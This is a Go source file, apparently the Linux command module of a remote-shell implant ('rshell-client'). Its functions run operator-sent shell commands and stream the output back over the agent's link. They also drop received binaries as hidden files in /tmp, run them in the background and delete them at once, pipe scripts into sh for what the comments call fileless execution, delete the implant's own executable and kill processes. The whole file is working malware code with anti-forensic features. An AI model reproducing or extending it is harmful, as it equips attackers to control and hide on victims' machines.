package commands

import (
	"rshell-client/shared/link"
	"bytes"
	"errors"
	"io"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func HideConsole() error {
	//return errors.New("this platform not supports HideConsole now.")
	return nil
}
func SetProcessDPIAware() error {
	//return errors.New("SetProcessDPIAware is not supported on this platform now.")
	return nil
}
func FullUnhook() error {
	return nil
}
func Run(b []byte) ([]byte, error) {
	return nil, nil
}
func DeleteSelf() ([]byte, error) {
	filename, err := os.Executable()
	if err != nil {
		return nil, err
	}
	Path := strings.ReplaceAll(string(filename), "\\", "/")
	err = os.RemoveAll(Path)
	if err != nil {
		return nil, errors.New("Remove failed")
	}
	return []byte("Remove " + string(filename) + " success"), nil
}
func KillProcess(pid uint32) ([]byte, error) {
	err := syscall.Kill(int(pid), 15)
	if err != nil {
		return nil, errors.New("process" + strconv.Itoa(int(pid)) + "not found")
	}
	return []byte("kill " + strconv.Itoa(int(pid)) + " success"), nil
}
func Drives() ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}
func Shell(path string, args []byte) ([]byte, error) {
	path = "/bin/sh"
	argsArray := []string{"-c", string(args)}
	cmd := exec.Command(path, argsArray...)
	stdout, err := cmd.StdoutPipe()
	cmd.Stderr = cmd.Stdout
	if err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}
	if err = cmd.Start(); err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}

	var buf []byte
	var count int
	time.Sleep(500 * time.Millisecond)
	buf = make([]byte, 1024*50)
	count, err = stdout.Read(buf)
	link.ReportData(0, buf[:count])
	for {
		buf = make([]byte, 1024*50)
		count, err = stdout.Read(buf)
		if err != nil {
			break
		}
		link.ReportData(0, append([]byte("[+] "+string(path)+" "+string(args)+" :\n"), buf[:count]...))
		time.Sleep(5000 * time.Millisecond)
	}

	if err = cmd.Wait(); err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}

	return []byte("success"), nil

}
func Execute(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}
func ExecuteAssembly(data []byte, args string) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}
func Inline_Bin(data []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}
func Inline_Execute(data []byte, args string) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}


func ExecuteLinuxBin(binaryContent []byte, args string) ([]byte, error) {
	tmpFile, err := os.CreateTemp("/tmp", ".*")
	if err != nil {
		return nil, errors.New("Create temp file failed: " + err.Error())
	}
	tmpPath := tmpFile.Name()
	tmpFile.Write(binaryContent)
	tmpFile.Close()
	os.Chmod(tmpPath, 0755)

	argFields := strings.Fields(args)
	cmd := exec.Command(tmpPath, argFields...)
	cmd.Stdout = io.Discard
	cmd.Stderr = io.Discard

	if err := cmd.Start(); err != nil {
		os.Remove(tmpPath)
		return nil, errors.New("exec failed: " + err.Error())
	}

	os.Remove(tmpPath)

	go cmd.Wait()

	return []byte("[+] Binary running in background\n"), nil
}

func ExecuteLinuxScript(scriptContent []byte, args string) ([]byte, error) {
	// 完全无文件落地执行：直接从管道执行脚本
	// 使用 sh -s 方式，脚本从stdin读取，兼容性更好
	
	var cmd *exec.Cmd
	if args != "" {
		// 如果有参数，通过sh -s传递，参数作为$1, $2等
		argFields := strings.Fields(args)
		shArgs := append([]string{"-s"}, argFields...)
		cmd = exec.Command("sh", shArgs...)
	} else {
		// 无参数时直接使用sh -s
		cmd = exec.Command("sh", "-s")
	}

	// 将脚本内容写入stdin
	cmd.Stdin = bytes.NewReader(scriptContent)
	
	// 捕获输出
	output, err := cmd.CombinedOutput()
	if err != nil {
		return output, err
	}

	return output, nil
}

